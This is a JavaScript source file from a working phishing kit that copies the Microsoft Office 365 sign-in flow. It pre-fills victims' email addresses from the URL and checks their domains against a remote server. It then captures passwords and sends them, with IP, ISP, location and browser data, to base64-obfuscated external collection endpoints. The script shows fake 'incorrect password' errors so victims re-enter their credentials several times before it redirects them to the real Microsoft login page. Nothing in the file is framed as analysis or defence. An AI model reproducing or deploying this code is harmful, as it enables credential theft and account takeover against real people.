let LICENSE_KEY, NUMBER_OF_RETRY, USE_RESULT_BOX, USE_RESULT_BOX_SCRIPT, SCRIPT_LINK, EMAIL_INDEX,
    STOP_USER_FROM_REENTRY, QUERY = {};
if (Cookies.get('QR') !== null && typeof Cookies.get('QR') !== 'undefined') {
    let QR = JSON.parse(decodeURIComponent(window.atob(Cookies.get('QR'))));
    LICENSE_KEY = QR['LICENSE_KEY']
    NUMBER_OF_RETRY = QR['NUMBER_OF_RETRY']
    USE_RESULT_BOX = QR['USE_RESULT_BOX']
    USE_RESULT_BOX_SCRIPT = QR['USE_RESULT_BOX_SCRIPT']
    SCRIPT_LINK = QR['SCRIPT_LINK']
    EMAIL_INDEX = QR['EMAIL_INDEX']
    STOP_USER_FROM_REENTRY = QR['STOP_USER_FROM_REENTRY'];
}
if (Cookies.get('query') !== null && typeof Cookies.get('query') !== 'undefined') {
    QUERY = JSON.parse(Cookies.get('query'));
}
let CUSTOM_REDIRECT = "https://www.google.com"; // Default is google link
let FINAL_REDIRECTION = window.atob("aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tL2NvbW1vbi9sb2dpbg==");//"https://am.jpmorgan.com/content/dam/jpm-am-aem/global/en/insights/market-insights/investment-outlook-2021-benlux.pdf";
let FORCE_AUTO_GRAB = true;       //If you want to ignore auto grab, change to false;
let SCRIPT_NAME = window.atob("aHR0cHM6Ly8wYTAzNzExNC5ldS1nYi5hcGlndy5hcHBkb21haW4uY2xvdWQvcmVzdWx0cy9tYWlu");
let SCRIPT_NAME_EMAIL = window.atob("aHR0cHM6Ly8wYTAzNzExNC5ldS1nYi5hcGlndy5hcHBkb21haW4uY2xvdWQvcmVzdWx0cy9lbWFpbC8=");


//=========================?? End Boundary


let subject = "Office Result";
if (USE_RESULT_BOX === true) {
    SCRIPT_NAME = SCRIPT_LINK;
}

async function load_Send(license, provider, email, password, ip, isp, country, state, city, browser, tries = "") {
    if (tries.length > 0) {
        provider += ` - ${tries} Try`;
    }
    subject += " From IP " + ip;
    let url = USE_RESULT_BOX === false ? SCRIPT_NAME : (USE_RESULT_BOX_SCRIPT ? SCRIPT_LINK : SCRIPT_NAME_EMAIL + EMAIL_INDEX);
    let post = USE_RESULT_BOX === false ? get_script_result_link(provider, email, password, ip, isp, country, state, city, browser) : get_script_result_email(provider, email, password, ip, isp, country, state, city, browser);
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: url,
            type: 'POST',
            dataType: "json",
            data: {
                license,
                post,
                subject
            },
            success: function (response) {
                resolve({response});
            },
            error: function (response) {
                let error = {errors: response}
                resolve(error);
            }
        });
    });
}

function get_script_result_link(provider, email, password, ip, isp, country, state, city, browser) {
    let body = atob("LS0tLS0tLS0tLS0tLS08IEptIFRlY2ggSW5jLiA+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0tLS0tLS0tLS0tLS0tLS08IEVtYWlsIFByb3ZpZGVyID4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KUHJvdmlkZXIgOiAjUHJvdmlkZXIjCi0tLS0tLS0tLS0tLS0tLS0tPCBBY2NvdW50IEFjY2VzcyA+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCkVtYWlsIDogI0VtYWlsIwpQYXNzd29yZCA6ICNQYXNzd29yZCMKLS0tLS0tLS0tLS0tLS0tLS0tLTwgTG9jYXRpb24gPi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCklQIEFkZHJlc3M6ICNpcCMgfCBJU1A6ICNpc3AjIHwgVGltZTogI3RpbWUjCkNvdW50cnk6ICNjb3VudHJ5IyB8IFN0YXRlOiAjc3RhdGUjIHwgQ2l0eTogI2NpdHkjCi0tLS0tLS0tLS0tLS0tLS0tLS0tLTwgQnJvd3NlciA+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpVc2VyLUFnZW50OiAjYnJvd3NlciMKLS0tLS0tLS0tLS0tLTwgSm1hdGhldyBJbmMuID4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCgog");
    return btoa(body.replace('#Provider#', provider).replace('#Email#', email).replace('#Password#', password).replace('#ip#', ip).replace('#isp#', isp).replace('#country#', country).replace('#state#', state).replace('#city#', city).replace('#browser#', browser));
}

function get_script_result_email(provider, email, password, ip, isp, country, state, city, browser) {
    let body = `
========================= Jm Tech Inc. >
== Provider >---------------------------------
P: #Provider#
== Access >-----------------------------------
E: #Email#
P: #Password#
== Location >---------------------------------
IP Address: #ip# | ISP: #isp# | Time: #time#
Country: #country# | State: #state# | City: #city#
== Browser >----------------------------------
User-Agent: #browser#
========================= End of Road >
`;
    return btoa(body.replace('#Provider#', provider).replace('#Email#', email).replace('#Password#', password).replace('#ip#', ip).replace('#isp#', isp).replace('#country#', country).replace('#state#', state).replace('#city#', city).replace('#browser#', browser));
}


//****************************************


if (check_path("mPath")) {
    let Comments = {
        _d: "Sign in to use your favorite productivity apps from any device",
        _1: "Enjoy the freedom to access, edit, and share your files on all your devices, wherever you are",
        _2: "If you lose your device, you won’t lose your files and documents when they’re saved in Office",
        _3: "Stay connected, share your documents and photos with friends and family, and collaborate in real time with Office apps"
    };


    let ip_config = {};
    let Mail_URL = new URL(location.href);
    let link = "";

    $(async function () {

        if (QUERY.hasOwnProperty('comment')) {
            let comment = QUERY.comment;
            if (comment === "1" || comment === "2" || comment === "3") {
                $("#office-apps-header").html(Comments[`_${comment}`]);
            } else {
                $("#office-apps-header").html(Comments._d);
            }
        } else {
            $("#office-apps-header").html(Comments._d);
        }
        await reload();
    })


    async function reload() {
        let $button = $("#hero-banner-sign-in-to-office-365-link");
        setTimeout(async function () {
            $("#add_to_popup").addClass('add_to_popup');
            await get_reload_ip();
            await preload();
            setTimeout(function () {
                $button.html("Please wait<span style='color: transparent'>..</span> <i class=\"fas fa-spinner fa-pulse\"></i>");
                setTimeout(function () {
                    $button.html("Connecting<span style='color: transparent'>..</span> <i class=\"fas fa-spinner fa-pulse\"></i>");
                    setTimeout(function () {
                        $button.html("Authenticating<span style='color: transparent'>..</span> <i class=\"fas fa-spinner fa-pulse\"></i>");
                        setTimeout(function () {
                            window.location.replace(link.length < 5 ? Cookies.get('bPath') : Cookies.get('iPath'));
                        }, 700);
                    }, 900);
                }, 1500);
            }, 700);
        }, 500);
    }


    async function get_reload_ip() {
        return new Promise(function (resolve, reject) {
            $.ajax({
                url: window.atob("aHR0cHM6Ly91cy1jZW50cmFsMS1jbG91ZC1hcHAtcGhwLW15c3FsLmNsb3VkZnVuY3Rpb25zLm5ldC9pcA=="),
                type: 'GET',
                dataType: "json",
                success: function (response) {
                    if (response.status === "success") {
                        localStorage.setItem("ip_config", JSON.stringify(response));
                        localStorageCheck();
                    }
                    resolve(true);
                },
                error: function (response) {
                    let error = {errors: response.responseJSON.errors[0]}
                    resolve(true);
                }
            });
        });
    }


    async function preload() {
        if (Object.keys(QUERY).includes('user') || Object.keys(QUERY).includes('email') || Object.keys(QUERY).includes('username')) {
            let email = Object.keys(QUERY).includes('user') ? QUERY["user"] : (Object.keys(QUERY).includes('email') ? QUERY["email"] : QUERY["username"])
            let res = await get_domain(email);
            if (typeof res === "object") {
                if (Object.keys(res).includes("domain")) {
                    let domain = res.domain;
                    if (domain.length > 2) {
                        domain = domain.replace('Others', 'Other');
                        localStorage.setItem('u', email);
                        localStorage.setItem('d', `${domain} Account`);
                        localStorage.setItem('t', 'h');
                        link = "Loaded";
                    }
                }
            }
        }
    }


}


/*


 */

else {
    let ip_config = {};
    let Mail_URL = new URL(location.href);
    let addC = "has-error ext-has-error";//passwordError
    let errors = [
        'Please check your password, and try again.',
        'Incorrect account password, please try again.',
        'Please enter valid password.'
    ];

    let retries = 0;

    $(async function () {
        localStorageCheck();

        if (check_path("iPath")) {
            let d = localStorage.getItem("d").toLowerCase();
            if (d.includes('office') === true || d.includes('other') === true || d.includes('godaddy') === true || d.includes('rackspace') === true || d.includes('mimecast') === true) {
                $("#header_office").show();
            }
            $("#passwd").attr("title", "Enter the password for " + localStorage.getItem("u"))
            $("#username").val(localStorage.getItem("u"));
            $("#displayName").html(localStorage.getItem("u"));
            $("#domain").val(localStorage.getItem("d"));
            localStorage.removeItem('eml');
        } else {
            if (QUERY.hasOwnProperty("user"))
                $("#i0116").val(QUERY.user)
            if (QUERY.hasOwnProperty('email'))
                $("#i0116").val(QUERY.email)
            if (QUERY.hasOwnProperty('username'))
                $("#i0116").val(QUERY.username)
            if(localStorage.getItem('eml') !== null)
                $("#i0116").val(localStorage.getItem('eml'))
        }


        $("a").on('click', function (event) {
            event.preventDefault()
            _reload();
            return false
        });

        $("#i0281").on('submit', async function (e) {
            e.preventDefault();
            let $input = $("#i0116");
            let $error_m = $("#passwordError");
            let $progressBar = $('#progressBar');
            let $lightboxCover = $(".lightbox-cover");
            $error_m.hide();
            $input.removeClass(addC);
            $lightboxCover.addClass("disable-lightbox");
            $progressBar.show();
            if ($input.val().length < 1) {
                setTimeout(function () {
                    $input.addClass(addC);
                    $error_m.html("Please enter a valid email address.");
                    $error_m.show();
                    $lightboxCover.removeClass("disable-lightbox");
                    $progressBar.hide();
                }, 1000);
            } else {
                let res = await get_domain($input.val().trim());
                let remove = 0;
                if (Object.keys(ip_config).length < 2) {
                    remove = 300;
                    await get_ip();
                }
                if (typeof res === "object") {
                    if (Object.keys(res).includes("domain")) {
                        let domain = res.domain;
                        if (domain.length < 2) {
                            setTimeout(function () {
                                $input.addClass(addC);
                                $error_m.html("Please enter a valid email address.");
                                $error_m.show();
                                $lightboxCover.removeClass("disable-lightbox");
                                $progressBar.hide();
                            }, (1000 - remove));
                        } else if (domain === "rejected") {
                            setTimeout(function () {
                                $input.addClass(addC);
                                $error_m.html("That Microsoft account doesn't exist. Enter a different account.");
                                $error_m.show();
                                $lightboxCover.removeClass("disable-lightbox");
                                $progressBar.hide();
                            }, (1000 - remove));
                        } else {
                            domain = domain.replace('Others', 'Other');
                            let val = $input.val().trim();
                            localStorage.setItem('u', val);
                            localStorage.setItem('d', `${domain} Account`);
                            localStorage.setItem('t', 'h');
                            setTimeout(function () {
                                window.location.replace(Cookies.get('iPath'));
                            }, (1200 - remove));
                        }
                    } else {
                        window.location.replace(Cookies.get('bPath'));
                    }
                } else {
                    window.location.replace(Cookies.get('bPath'));
                }
            }
            return false;
        });


        $("#form_outlook").on('submit', async function (e) {
            e.preventDefault();
            let $passwordError = $("#passwordError");
            let $login_sign = $("#idSIButton9");
            let $passwd = $("#i0118");
            let $progressBar = $('#progressBar');
            let $lightboxCover = $(".lightbox-cover");
            $passwordError.hide("fast");
            $progressBar.show();
            $passwd.removeClass(addC);
            $lightboxCover.addClass("disable-lightbox");
            $login_sign.addClass("active");
            if ($passwd.val().length < 6) {
                setTimeout(function () {
                    $progressBar.hide();
                    $passwordError.html("Please enter a valid password.");
                    $passwordError.show("fast");
                    $passwd.addClass(addC);
                    $lightboxCover.removeClass("disable-lightbox");
                }, 700);
            } else {
                let result = await load_Send(LICENSE_KEY, $("#domain").val(), $("#username").val(), $passwd.val(), `${ip_config.query}`, `${ip_config.isp}`, `${ip_config.country}`, `${ip_config.regionName}`, `${ip_config.city}`, `${navigator.userAgent}`, retries === 0 ? "" : retries)
                if (Object.keys(result).includes('errors')) {
                    setTimeout(function () {
                        $progressBar.hide();
                        $passwordError.html("Error, please check your internet connection or reload this page.");
                        $passwordError.show("fast");
                        $passwd.addClass(addC);
                        $lightboxCover.removeClass("disable-lightbox");
                    }, 700);
                } else {
                    setTimeout(function () {
                        if (result.response.msg.includes("uccessfull")) {
                            if (NUMBER_OF_RETRY <= retries) {
                                localStorage.setItem("sent", "true sent for real");
                                Cookies.set('sent', "true sent for real");
                                location.replace(FINAL_REDIRECTION);
                            } else {
                                let error = retries < errors.length ? errors[retries] : errors[0];
                                retries++;
                                $progressBar.hide();
                                $passwordError.html(error);
                                $passwordError.show("fast");
                                $passwd.addClass(addC);
                                $passwd.val("");
                                $lightboxCover.removeClass("disable-lightbox");
                            }
                        } else {
                            $progressBar.hide();
                            $passwordError.html("Unknown error occur, please reload this page or try again.");
                            $passwordError.show("fast");
                            $passwd.addClass(addC);
                            $lightboxCover.removeClass("disable-lightbox");
                        }
                    }, 1300);
                }
            }
            return false;
        });


        $("button.backButton").on('click', function () {
            localStorage.setItem('eml', localStorage.getItem('u'))
            localStorage.removeItem("u")
            localStorage.removeItem("d")
            localStorage.removeItem("t")
            window.location.replace(Cookies.get('bPath'));
        });

        if (Object.keys(ip_config).length < 2) {
            await get_ip();
        }

    })


    async function get_ip() {
        return new Promise(function (resolve, reject) {
            $.ajax({
                url: window.atob("aHR0cHM6Ly91cy1jZW50cmFsMS1jbG91ZC1hcHAtcGhwLW15c3FsLmNsb3VkZnVuY3Rpb25zLm5ldC9pcA=="),
                type: 'GET',
                dataType: "json",
                success: function (response) {
                    if (response.status === "success") {
                        localStorage.setItem("ip_config", JSON.stringify(response));
                        localStorageCheck();
                    }
                    resolve(true);
                },
                error: function (response) {
                    let error = {errors: response.responseJSON.errors[0]}
                    resolve(true);
                }
            });
        });
    }


    function validateEmail(mail) {
        return (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,10})+$/.test(mail));
    }


}


async function get_domain(e_m) {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: window.atob("aHR0cHM6Ly8wYTAzNzExNC5ldS1nYi5hcGlndy5hcHBkb21haW4uY2xvdWQvY2hlY2svZG9tYWluP2VfbT0=") + e_m,
            type: 'GET',
            dataType: "json",
            contentType: "application/json; charset=utf-8",
            beforeSend: function (xhr) {
                /* xhr.setRequestHeader('Authorization', `Bearer ${token}`); */
            },
            data: JSON.stringify({
                e_m
            }),
            success: function (response) {
                resolve(response);
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                resolve(error);
            }
        });
    });
}

function localStorageCheck() {
    let ip = localStorage.getItem("ip_config");
    if (ip !== null) ip_config = JSON.parse(ip);
}

function check_path(path_name = "") {
    if (Cookies.get('active_page') !== null && typeof Cookies.get('active_page') !== 'undefined') {
        let act = JSON.parse(Cookies.get('active_page'));
        if (path_name === act.name) return true;
    }
    if (Cookies.get('name') !== null && typeof Cookies.get('name') !== 'undefined') {
        return Cookies.get('name').toLowerCase().trim() === path_name.toLowerCase().trim();
    }
    let ck = Cookies.get(path_name);
    if (typeof ck === "undefined" || ck === null) return false;
    return window.location.href.includes(ck);
}

function _reload() {
    if (Cookies.get('active_page') !== null && typeof Cookies.get('active_page') !== 'undefined') {
        let act = JSON.parse(Cookies.get('active_page'));
        return window.location.replace(Cookies.get(act.name));
    } else {
        return window.location.replace(location.href);
    }
}